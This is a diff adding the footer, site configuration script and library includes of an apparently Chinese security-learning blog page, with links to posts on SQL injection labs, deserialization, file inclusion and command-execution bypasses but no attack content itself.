+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" title="正则表达式">正则表达式</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/24/sqli-labs/" title="Sqli-labs靶场通关">Sqli-labs靶场通关</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/23/hello-world/" title="Hello World">Hello World</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="php反序列化漏洞学习">php反序列化漏洞学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含及伪协议的使用">文件包含及伪协议的使用</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/26/nessctf/" title="NSSCTF精选">NSSCTF精选</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/" title="无字母数字rce">无字母数字rce</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/27/unserialize-labs/" title="Unserialize-labs">Unserialize-labs</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/27/upload-labs%E9%9D%B6%E5%9C%BA/" title="upload-labs靶场">upload-labs靶场</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="命令执行漏洞及绕过方法">命令执行漏洞及绕过方法</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">hq185187 @ 不良人天藏星</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/04/28/命令执行漏洞/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
